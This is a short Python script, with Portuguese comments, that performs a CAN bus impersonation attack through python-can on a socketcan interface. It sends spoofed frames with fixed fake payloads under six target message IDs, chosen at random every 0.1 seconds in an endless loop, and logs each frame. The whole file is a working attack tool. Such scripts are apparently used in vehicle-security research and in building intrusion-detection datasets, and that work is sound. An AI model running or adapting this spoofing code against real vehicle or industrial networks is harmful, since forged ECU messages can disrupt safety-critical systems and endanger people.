import can
import logging
import time
import random

# ================================
# CONFIGURAÃ‡Ã•ES
# ================================
CAN_CHANNEL = 'can0'
CAN_BUSTYPE = 'socketcan'

# IDs reais que serÃ£o imitados
TARGET_IDS = [141, 26, 131, 326, 36, 397]

# Payloads falsos (cada ID pode ter um payload diferente ou aleatÃ³rio)
FAKE_PAYLOADS = [
    [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04],  # p/ ID 141
    [0xAA, 0xBB, 0xCC, 0xDD, 0x10, 0x20, 0x30, 0x40],  # p/ ID 26
    [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88],  # p/ ID 131
    [0x99, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22],  # p/ ID 326
    [0xF0, 0x0F, 0xF0, 0x0F, 0xAA, 0xBB, 0xCC, 0xDD],  # p/ ID 36
    [0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF]   # p/ ID 397
]

SEND_INTERVAL = 0.1  # segundos entre mensagens

# ================================
# LOG
# ================================
logging.basicConfig(
    filename="impersonation_attack_multi.log",
    level=logging.INFO,
    format="%(asctime)s ID=%(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

# ================================
# FUNÃ‡ÃƒO DO ATAQUE
# ================================
def impersonation_attack_multi():
    bus = can.interface.Bus(channel=CAN_CHANNEL, bustype=CAN_BUSTYPE)
    print("[ATAQUE] Iniciando Impersonation Attack com mÃºltiplos IDs... (CTRL+C para parar)")

    try:
        while True:
            # Escolhe um ID e payload aleatoriamente
            idx = random.randint(0, len(TARGET_IDS) - 1)
            target_id = TARGET_IDS[idx]
            fake_data = FAKE_PAYLOADS[idx]

            msg = can.Message(arbitration_id=target_id, data=fake_data, is_extended_id=False)
            bus.send(msg)

            logging.info(f"{hex(msg.arbitration_id)} DATA={' '.join(f'{b:02X}' for b in msg.data)}")
            print(f"[SENT] ID={hex(target_id)} DATA={fake_data}")

            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[INFO] Impersonation Attack interrompido.")
    finally:
        bus.shutdown()

# ================================
# MAIN
# ================================
if __name__ == "__main__":
    impersonation_attack_multi()